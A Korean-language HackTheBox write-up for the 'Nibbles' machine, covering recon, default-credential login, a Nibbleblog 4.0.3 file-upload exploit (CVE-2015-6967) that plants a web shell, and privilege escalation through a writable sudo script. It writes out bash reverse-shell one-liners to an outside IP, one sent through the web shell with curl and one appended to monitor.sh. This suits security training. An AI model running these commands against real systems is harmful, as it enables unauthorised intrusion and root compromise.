# Nibbles - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA nibbles 10.10.10.75
```
<img width="1108" height="383" alt="image" src="https://github.com/user-attachments/assets/002b3909-f6f4-40c6-bcdf-cc5d51cb7956" />

- SSH(22)
- HTTP(80)

---
## HTTP
### banner grabbing
<img width="1108" height="335" alt="image" src="https://github.com/user-attachments/assets/f0de369f-736e-43a1-98a1-d69c8a827ab9" />

<br>
<br>

- `burpsuite`에서 `/nibbleblog`발견.
<img width="780" height="75" alt="image" src="https://github.com/user-attachments/assets/5eb92bb7-c855-483e-8170-f072b8d199de" />

<br>
<br>

- `/nibbleblog` banner grabbing
<img width="1110" height="335" alt="image" src="https://github.com/user-attachments/assets/48729d49-c328-41a6-9469-5dfa8176e925" />

### Nibbleblog
- https://github.com/dignajar/nibbleblog
- `/admin.php`경로가 존재하여 접속.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/3970c282-d952-4e2f-a744-55b978be5709" />

<br>
<br>

- 계정을 찾을 수 없었는데, 서버가 `Nibbleblog`를 사용한다는 점과`/nibbleblog`의 소스코드를 확인하여 `nibbles`라는 단어가 반복되는 것으로 확인.
<img width="659" height="500" alt="image" src="https://github.com/user-attachments/assets/c050fe13-de37-43be-8d2c-f609574296d1" />

<br>
<br>

- `admin:nibbles` 로그인.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/dc22e7ba-e6c0-43cc-9545-056e99ea01fa" />

<br>
<br>

- `Nibbleblog 4.0.3`
<img width="1065" height="136" alt="image" src="https://github.com/user-attachments/assets/feb61b6f-83a4-454e-bd5c-ea17be1b8cc1" />

### CVE-2015-6967
- https://nvd.nist.gov/vuln/detail/CVE-2015-6967
- `My Image` 플러그인에서 파일업로드 취약점.
<img width="1100" height="482" alt="image" src="https://github.com/user-attachments/assets/39d4ae64-98df-4f13-b5df-64fa8b7ceea3" />

<br>
<br>

- `Plugins > My image > Configure`
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/6ac6be34-c257-4250-bc51-7ca8860c1b78" />

<br>
<br>

- 웹 셸 업로드.
<img width="1100" height="336" alt="image" src="https://github.com/user-attachments/assets/b46efaa0-cd7f-4083-892b-0ea56320e017" />

<br>
<br>

- 에러 메세지가 나오지만 `/nibbleblog/content/private/plugins/my_image/image.php`경로에서 웹 셸 실행 가능.
<img width="756" height="85" alt="image" src="https://github.com/user-attachments/assets/1b9df31d-7bb8-4868-9631-f9029fa4a6ae" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl 'http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22'
```
<img width="1106" height="67" alt="image" src="https://github.com/user-attachments/assets/ca1bbed9-a386-4e1a-a673-60333ea4a78a" />

<br>
<br>

- 셸 획득.
<img width="1106" height="177" alt="image" src="https://github.com/user-attachments/assets/3e9191fb-dc23-4b66-9261-40a841c4f890" />

---
## Privesc
- `/home/nibbler/personal/stuff/monitor.sh`를 `root`권한으로 실행 가능.
```bash
sudo -l
```
<img width="1106" height="144" alt="image" src="https://github.com/user-attachments/assets/46aae3d9-f068-46c0-99e6-ecf9443cf614" />

<br>
<br>

- `/home/nibbler`에서 `personal.zip` 압축 해제.
```bash
unzip personal.zip
```
<img width="1106" height="98" alt="image" src="https://github.com/user-attachments/assets/3772abbd-6838-4d80-855e-2f7de45c16e4" />

<br>
<br>

- `monitor.sh`를 `nibbler`유저가 수정 가능.
<img width="1106" height="98" alt="image" src="https://github.com/user-attachments/assets/85799786-56b6-4685-ab2b-fe940127dd5b" />

<br>
<br>

- 리버스 셸 코드 추가.
```bash
echo 'bash -c "bash -i >&/dev/tcp/10.10.16.4/80 0>&1"' >> monitor.sh
```
<img width="1106" height="44" alt="image" src="https://github.com/user-attachments/assets/b32268e0-4ee0-4e53-9bbc-8ee94c4d46ad" />

<br>
<br>

- `monitor.sh`실행.
```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```
<img width="1106" height="83" alt="image" src="https://github.com/user-attachments/assets/86351bbc-0528-47cc-847b-6272aa827042" />

<br>
<br>

- 셸 획득.
<img width="1106" height="140" alt="image" src="https://github.com/user-attachments/assets/e03b66e5-185a-4ae6-99d6-7f2eac3a3fef" />

---
## FLAG
- `/home/nibbler/user.txt`
<img width="1106" height="193" alt="image" src="https://github.com/user-attachments/assets/314a96c7-a860-4f9f-8b6f-6741d956bc14" />

<br>
<br>

- `/root/root.txt`
<img width="1106" height="231" alt="image" src="https://github.com/user-attachments/assets/7ee05157-6205-4061-b170-760241f01d3f" />
















